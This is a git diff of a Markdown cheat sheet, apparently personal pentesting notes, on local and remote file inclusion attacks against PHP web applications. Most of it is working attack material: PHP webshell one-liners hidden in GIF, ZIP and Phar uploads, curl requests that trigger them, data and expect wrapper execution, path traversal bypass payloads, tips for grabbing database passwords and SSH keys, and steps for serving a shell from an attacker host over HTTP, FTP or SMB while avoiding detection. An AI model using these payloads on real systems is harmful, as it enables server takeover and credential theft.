@@ -3,6 +3,10 @@
 * [Local file inclusion](#local-file-inclusion) (LFI)
 	* Path Traversal
 	* Second-Order Attacks
+	* LFI and File Uploads
+		* GIF Image Upload
+		* ZIP Upload
+		* Phar Upload
 * [Bypasses Techniques](#bypasses-techniques)
 	* Non-Recursive Path Traversal Filters
 	* Encoding
@@ -16,6 +20,7 @@
 	* PHP Wrappers
 		* Data / Input / Expect
 	* [Remote File Inclusion](#remote-file-inclusion) (RFI)
+		* Python / FTP / SMB
 * [Read, Write and Execute Functions](#read-write-and-execute-functions)
 ---
 ## Overview
@@ -44,13 +49,55 @@ If we were not sure of the directory the web application is in, we can add `../`
 - **Second-Order Attacks**
 	- If a web application allow the user to download his avatar through `/profile/$username/avatar.png`, If we crafted a malicious username `../../../etc/passwd`.
 	- If the web application didn't sanitize or filter our username, It will be possible to pull another local file from the system rather the user avatar.
+- LFI and File Uploads
+	- GIF Image Upload
+		- Crafting Malicious Image
+			``` bash
+			echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+			```
+		- We can find the file path through the HTML code of the site or through the URL 
+			``` HTML
+			<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+			```
+		- Include the uploaded file in the LFI vulnerable function
+			``` bash
+			curl "http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id"
+			```
+	- Zip Upload (zlib:// bzip2:// zip:// wrappers to execute PHP code. This wrapper isn't enabled by default) 
+		- Crafting Malicious ZIP
+			``` bash
+			echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+			```
+		- Include the uploaded file in the LFI vulnerable function
+			``` bash
+			curl "http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"
+			```
+	- Phar Upload
+		- Create `shell.php`
+			``` PHP
+			<?php
+			$phar = new Phar('shell.phar');
+			$phar->startBuffering();
+			$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+			$phar->setStub('<?php __HALT_COMPILER(); ?>');
+			
+			$phar->stopBuffering();
+			```
+		- compile it into a `phar` file and rename it to `shell.jpg`
+			``` bash
+			php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+			```
+		- Include the uploaded file in the LFI vulnerable function
+			``` bash
+			curl "http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id"
+			```
 ---
-> [!NOTE]
-> Try to combine many techniques together because Some web applications may apply many filters together. 
+> [!TIP]
+> Don't forget to try to combine many techniques together because Some web applications may apply many filters together. 
 ## Bypasses Techniques
 - **Non-Recursive Path Traversal Filters**
-	- If the `../` substring is being replaced from user input. payloads:
-		- `....//` , `..././` , `....\/` , `....////`
+	- If the `../` substring is being replaced from user input.
+		- payloads: `....//` , `..././` , `....\/` , `....////`
 - **Encoding**
 	- If the target didn't allow `.` and `/` characters as input
 		- It's a must  to URL encode all characters, including the dots. `../etc/passwd`: `%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
@@ -73,8 +120,7 @@ If we were not sure of the directory the web application is in, we can add `../`
 				echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
 				```
 		2. **Null Bytes**
-			- PHP versions before 5.5 were vulnerable to `null byte injection` 
-			- Adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it.
+			- PHP versions before 5.5 were vulnerable to `null byte injection`, `%00` terminate strings.
 			- Sending `/etc/passwd%00` would be `/etc/passwd%00.php` but the path used would actually be `/etc/passwd`
 - **Filename Prefix**
 	- If the web app takes an input `file` and appends `lang_` to it, resulting in `lang_../../../etc/passwd` which will be invalid path.
@@ -85,9 +131,9 @@ If we were not sure of the directory the web application is in, we can add `../`
 - There are 4 types of filters: [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php).
 - To use PHP wrapper streams, we can use the `php://` scheme in our string and access the PHP filter wrapper with `php://filter/`.
 - The main parameters for filter wrapper are `resource` and `read`.
-	- `resource` With it we can specify the stream we would like to apply our filter on (e.g. local file).
-	- `read` With it we can apply different filters on the input resource.
-	- The important filter for FI is `convert.base64-encode` filter, under `Conversion Filters`.
+	- `resource` To specify the stream we would like to apply our filter on (e.g. local file).
+	- `read` To apply different filters on the input resource.
+	- The important filter for FI is `convert.base64-encode` filter, under [Conversion Filters](https://www.php.net/manual/en/filters.convert.php).
 ###  Scenarios
 - **If we have a LFI and the site using appended extension to the user input and we want to read the local PHP files**:
 	1. Fuzzing to find PHP files.
@@ -106,9 +152,9 @@ If we were not sure of the directory the web application is in, we can add `../`
 			```
 ---
 ## From LCI to RCE
-> [!Note]
-> Search for DB password in `config.php` and check for password reuse.
-> Check `.ssh` directory on each user home directory for their private keys `id_rsa`.
+> [!TIP]
+> - Search for DB password in `config.php` and check for password reuse.
+> - Check `.ssh` directory on each user home directory for their private keys `id_rsa`.
 - **PHP wrappers**:
 	- [Data](https://www.php.net/manual/en/wrappers.data.php)
 		- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
@@ -121,9 +167,9 @@ If we were not sure of the directory the web application is in, we can add `../`
 				```
 			- Encode our payload then send it with data wrapper `data://text/plain;base64`
 				``` bash
-				echo '<?php system($_GET["cmd"]); ?>' | base64
+				$ echo '<?php system($_GET["cmd"]); ?>' | base64
 				PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
-				curl -s 'http://URL/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep id
+				$ curl -s 'http://URL/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep id
 				```
 	- [Input](https://www.php.net/manual/en/wrappers.php.php)
 		- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
@@ -140,10 +186,39 @@ If we were not sure of the directory the web application is in, we can add `../`
 			``` bash
 			curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 			```
-- **Remote File Inclusion**:
-	- Any RFI vulnerability is also an LFI vulnerability, but an LFI may not necessarily be an RFI. Check [Read, Write and Execute Functions](#read-write-and-execute-functions)
-	- Remote URL inclusion in `PHP` require the `allow_url_include` setting to be enabled.
-	- 
+### Remote File Inclusion:
+- Any RFI vulnerability is also an LFI vulnerability, but an LFI may not necessarily be an RFI. Check [Read, Write and Execute Functions](#read-write-and-execute-functions)
+- How to verify a RFI:
+	- If the server is running PHP in the back-end ?
+		- Check `allow_url_include` setting on `php.ini`, (not reliable cause the vulnerable function may not allow remote URLS)
+		- Try to include a local URL `http://127.0.0.1:80/index.php` to see firewall reaction.
+			- Don't include the vulnerable page as this can cause recursive inclusion loop which may lead to DoS on the server.
+- **Remote Code Execution with RFI**
+	- Create a malicious script:
+		``` bash
+		echo '<?php system($_GET["cmd"]); ?>' > shell.php
+		```
+	- Host the malicious script and use common HTTP ports to avoid detection then visit the infected page:
+		- Python
+			``` bash
+			sudo python3 -m http.server <LISTENING_PORT>
+			# Visit the URL on the browser:
+			curl "http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id"
+			```
+		- FTP
+			``` bash
+			sudo python -m pyftpdlib -p 21
+			# Visit the URL on the browser (If the server uses anonymous creds):
+			curl "http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id"
+			# If the server requires creds:
+			curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+			```
+		- SMB (If the vulnerable web application is hosted on a Windows server)
+			``` bash
+			impacket-smbserver -smb2support share $(pwd)
+			# Visist the URL on the browser:
+			"http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami"
+			```
 ---
 ## Read, Write and Execute Functions
 
